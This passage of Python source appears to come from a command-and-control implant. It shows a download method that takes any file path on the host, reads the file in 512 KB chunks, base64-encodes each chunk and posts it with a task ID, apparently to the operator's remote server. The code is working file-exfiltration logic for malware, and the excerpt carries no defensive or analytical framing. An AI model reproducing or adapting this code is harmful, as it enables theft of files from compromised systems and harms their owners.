    def download(self, task_id, file):
        file_path = file if file[0] == os.sep \
                else os.path.join(self.current_directory,file)

        chunk_size = 512000
        file_size = os.stat(file_path).st_size 
        total_chunks = int(file_size / chunk_size) + (file_size % chunk_size > 0)

        data = {
            "action": "post_response", 
            "responses": [
            {
                "task_id": task_id,
                "total_chunks": total_chunks,
                "full_path": file_path,
                "chunk_size": chunk_size
            }]
        }
        initial_response = self.postMessageAndRetrieveResponse(data)
        chunk_num = 1
        with open(file_path, 'rb') as f:
            while True:
                content = f.read(chunk_size)
                if not content:
                    break # done
                data = {
                    "action": "post_response", 
                    "responses": [
                        {
                            "chunk_num": chunk_num,
                            "file_id": initial_response["responses"][0]["file_id"],
                            "chunk_data": base64.b64encode(content).decode(),
                            "task_id": task_id
                        }
                    ]
                }
                chunk_num+=1
                response = self.postMessageAndRetrieveResponse(data)
